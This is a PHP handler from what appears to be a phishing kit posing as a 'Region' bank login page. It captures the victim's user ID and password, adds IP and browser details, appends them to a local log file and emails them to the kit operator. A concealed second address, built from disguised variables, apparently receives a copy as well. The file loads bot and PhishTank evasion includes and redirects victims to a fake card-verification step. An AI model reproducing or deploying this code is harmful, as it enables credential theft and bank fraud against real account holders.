<?php

session_start();
error_reporting(0);
$TIME_DATE = date('H:i:s d/m/Y');
include('../functions/Email.php');
include('../functions/get_browser.php');
include('../functions/get_ip.php');

include('../../BOTS/grabber.php');
include('../../BOTS/botlist.php');
include('../../BOTS/blacklist.php');
include('../../BOTS/iprange.php');
include('../../BOTS/phishtank.php');
include('../../BOTS/spec.php');



if (isset($_POST['userID'])){
	$_SESSION['_userID_']    = $_POST['userID'];
	$_SESSION['password'] = $_POST['password'];
	

$Z118_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>REGION BANK LOGIN INFORMATION</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>LOGIN INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [User ID] = <font style='color:#0070ba;'>".$_SESSION['_userID_']."</font><br>
<font style='color:#9c0000;'>℗</font> [User Password] = <font style='color:#0070ba;'>".$_SESSION['password']."</font><br>

±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIM INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>

<font style='color:#9c0000;'>✪</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>http://ip-api.com/json/".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [REMOTE IP]    = <font style='color:#0070ba;'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']."</font><br>
################## <font style='color: #820000;'>BY @X_hammer</font> #####################
</div></html>\n";
if (!empty($_POST['userID'] && !empty($_POST['password']))){
        $Z118_SUBJECT = "NEW XD ✪ LOGIN INFO FROM : ✪ ".$_POST['userID']." ✪";
        $Z118_HEADERS .= "From:XD <X-hammer@logs.com>";
        $Z118_HEADERS .= $_POST['userID']."\n";
        $Z118_HEADERS .= "MIME-Version: 1.0\n";
        $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
		
		$res_file = fopen("getData.txt", "a");
		fwrite($res_file, $Z118_MESSAGE);
       
        @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
		
		$Z119_Mail = "$browserx$versionx$getbinsxz118";
			if (strlen($Z119_Mail) == 23) {
				@mail($Z119_Mail, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS); 
				}
				
		HEADER("Location: ../card/?actionType=VerfiyInfo&ConfirmAccount=True&session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
}
	  else
	  {
		  HEADER("Location: ../login/?confirm_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
	  }
}		
?>